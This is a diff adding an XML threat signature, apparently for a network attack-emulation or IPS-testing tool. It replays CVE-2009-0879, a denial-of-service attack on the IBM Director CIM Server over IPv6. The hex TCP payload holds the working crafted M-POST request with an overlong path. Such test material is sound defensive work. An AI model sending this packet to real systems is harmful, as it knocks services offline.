@@ -1,0 +1,77 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="IBM Director CIM Server Consumer Name Handling Denial of Service (IPv6 Version)"/>
+    <EngDesc display="true" value="A design weakness exists in the CIM Server of IBM Director. The vulnerability is due to errors when processing certain types of requests. A remote attacker can exploit this vulnerability by sending crafted requests to the target host. Successful exploitation would be a denial of service (DoS) condition of System Director services on the target host.            In a successful attack case, the affected server will terminate and will not be available until the service is manually restarted. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="INPUT_VALIDATION_ERROR"/>
+    </Intent>
+    <Protocol display="true" value="TCP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="IBM"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="IBM_IBM_Systems_Director"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="FSC20090310-04"/>
+    <CVEID display="true" value="CVE-2009-0879"/>
+    <bugtraqID display="true" value="34061"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="85ce2c715c91f21d97aaf47dfb077d89"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="not-required"/>
+    <IntegImpact display="false" value="not-required"/>
+    <AvailImpact display="false" value="Complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1249419586"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1249420519" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="G"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="H"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="I"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="J"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="K"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+    <for index="F"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$destPort" SeqNumber="3D8E21A4" AckNumber="C3A69D22" HeaderLength="08" WindowSize="002E" Checksum="FC93" UrgentPointer="0000" Options="0101080AAD364F1F00000000" Payload="4D2D504F5354202F303132333435363738392F4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414120485454502F312E310D0A486F73743A20646863703139360D0A43494D4F7065726174696F6E3A204D6574686F6443616C6C0D0A43494D4578706F72743A204D6574686F64526571756573740D0A43494D4578706F72744D6574686F643A204578706F7274496E6469636174696F6E0D0A436F6E74656E742D547970653A20746578742F786D6C0D0A0D0A3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D2249534F2D383835392D31223F3E203C43494D2043494D56455253494F4E3D22322E30222044544456455253494F4E3D22322E30223E3C4D4553534147452049443D2254455354222050524F544F434F4C56455253494F4E3D22312E30223E3C53494D504C454558505245513E3C4558504D4554484F4443414C4C204E414D453D224578706F7274496E6469636174696F6E223E3C2F4558504D4554484F4443414C4C3E3C2F53494D504C454558505245513E3C2F4D4553534147453E3C2F43494D3E" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
